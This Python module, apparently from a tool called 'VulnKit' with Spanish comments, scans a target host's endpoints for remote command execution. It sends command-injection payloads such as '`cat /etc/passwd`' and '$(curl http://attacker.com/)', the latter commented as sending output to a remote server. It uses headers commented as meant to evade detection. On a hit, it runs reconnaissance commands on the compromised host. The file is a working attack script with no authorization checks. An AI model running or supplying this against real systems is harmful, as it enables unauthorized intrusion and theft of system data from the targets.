import requests
import time
import json

def execute(target):
    print(f"\n[INFO] Iniciando prueba avanzada de Ejecución Remota de Comandos (RCE) en: {target}")
    
    # Lista ampliada de endpoints comunes y posibles vectores de RCE
    endpoints = [
        "/test",
        "/debug",
        "/api/exec",
        "/execute",
        "/cmd",
        "/run",
        "/admin",
        "/shell"
    ]
    
    # Payloads avanzados
    payloads = [
        "; id",                            # Unix básico
        "&& whoami",                       # Combinación lógica
        "| uname -a",                      # Información del sistema
        "`cat /etc/passwd`",               # Archivos sensibles
        "$(echo VulnKit)",                 # Expansión de shell
        "|| echo vulnerable",              # Comando en caso de error
        "$(curl http://attacker.com/)",    # Filtrado de salida a un servidor remoto
        "$(sleep 5)",                      # Verificación de ejecución lenta
        "2>&1 | tee /tmp/output.txt"       # Redirección de salida
    ]
    
    # Indicadores de vulnerabilidad en respuestas
    success_indicators = [
        "uid=", "gid=", "root", "bash", "/home/",
        "kernel", "uname", "VulnKit", "system info"
    ]
    
    # Cabeceras personalizadas para evitar detección y bloqueo
    headers = {
        "User-Agent": "Mozilla/5.0 (VulnKit-RCE)",
        "Content-Type": "application/json",
        "Accept": "*/*"
    }
    
    # Opciones avanzadas para detectar WAF y otras protecciones
    print(f"[INFO] Probando la presencia de WAF o mecanismos de bloqueo...")
    try:
        waf_test = requests.get(f"http://{target}/", headers=headers, timeout=5)
        if waf_test.status_code == 403 or "waf" in waf_test.text.lower():
            print("[ADVERTENCIA] Se detectó un WAF activo. Los resultados podrían estar limitados.")
    except requests.ConnectionError:
        print("[ERROR] No se pudo conectar con el objetivo.")
        return "Objetivo no accesible"

    vulnerable_endpoints = []

    for endpoint in endpoints:
        for payload in payloads:
            url = f"http://{target}{endpoint}?cmd={payload}"
            print(f"\n[INFO] Probando {url} con payload: {payload}")
            try:
                start_time = time.time()
                response = requests.get(url, headers=headers, timeout=10)
                response_time = time.time() - start_time
                
                # Comprobación de indicadores en la respuesta
                if any(indicator in response.text.lower() for indicator in success_indicators):
                    print(f"[ALERTA] ¡RCE detectado en {url} con payload: {payload}")
                    print(f"[DETALLES] Código de estado: {response.status_code}, Tiempo de respuesta: {response_time:.2f}s")
                    
                    # Almacenar detalles de vulnerabilidades detectadas
                    vulnerable_endpoints.append({
                        "url": url,
                        "payload": payload,
                        "response_code": response.status_code,
                        "response_time": f"{response_time:.2f}s",
                        "response_preview": response.text[:500]  # Primeros 500 caracteres
                    })
                    
                    # Extraer más información del sistema si es posible
                    extract_system_info(url)
            except requests.Timeout:
                print(f"[ERROR] Tiempo de espera agotado para {url}")
            except requests.ConnectionError:
                print(f"[ERROR] No se pudo conectar con {url}")
            except Exception as e:
                print(f"[ERROR] Error inesperado al probar {url}: {e}")

    if vulnerable_endpoints:
        print("\n[RESULTADOS] Vulnerabilidades detectadas:")
        for vuln in vulnerable_endpoints:
            print(f" - Endpoint: {vuln['url']}")
            print(f"   Payload: {vuln['payload']}")
            print(f"   Código de respuesta: {vuln['response_code']}")
            print(f"   Tiempo de respuesta: {vuln['response_time']}")
            print(f"   Vista previa: {vuln['response_preview']}")
        return "Vulnerable a RCE"
    else:
        print("\n[INFO] No se encontraron vulnerabilidades en los endpoints probados.")
        return "No vulnerable"

def extract_system_info(vulnerable_url):
    """
    Función para extraer información adicional del sistema si el endpoint es vulnerable.
    """
    print(f"[INFO] Intentando extraer información adicional del sistema desde: {vulnerable_url}")
    info_payloads = [
        "uname -a", "cat /etc/os-release", "id", "whoami",
        "ls /home", "cat /proc/version", "df -h"
    ]
    headers = {
        "User-Agent": "Mozilla/5.0 (VulnKit-RCE)",
        "Content-Type": "application/json",
        "Accept": "*/*"
    }
    
    for cmd in info_payloads:
        try:
            exploit_url = f"{vulnerable_url}&cmd={cmd}"
            response = requests.get(exploit_url, headers=headers, timeout=10)
            print(f"[INFO] Resultado del comando '{cmd}':\n{response.text[:500]}")
        except Exception as e:
            print(f"[ERROR] Error al ejecutar el comando '{cmd}': {e}")
